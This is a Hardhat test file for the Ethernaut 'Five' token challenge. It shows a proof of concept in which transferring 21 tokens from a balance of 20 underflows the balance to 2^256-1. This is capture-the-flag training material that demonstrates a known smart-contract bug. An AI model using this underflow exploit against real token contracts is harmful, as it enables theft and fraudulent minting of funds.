const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Ethernaut - Five", function () {
  async function deployToken() {
    const [deployer] = await ethers.getSigners();

    const EthernautFiveToken = await ethers.getContractFactory(
      "EthernautFiveToken"
    );
    const ethernautFiveToken = await EthernautFiveToken.deploy(20);
    await ethernautFiveToken.deployed();

    return { deployer, ethernautFiveToken };
  }

  describe("Exploit", function () {
    it("Deployer can change their balance to 2^256-1 using the transfer method", async function () {
      const { deployer, ethernautFiveToken } = await loadFixture(deployToken);

      expect(await ethernautFiveToken.balanceOf(deployer.address)).to.equal(20);
      await ethernautFiveToken
        .connect(deployer)
        .transfer(ethers.constants.AddressZero, 21);
      expect(await ethernautFiveToken.balanceOf(deployer.address)).to.equal(
        ethers.constants.MaxUint256
      );
    });
  });
});
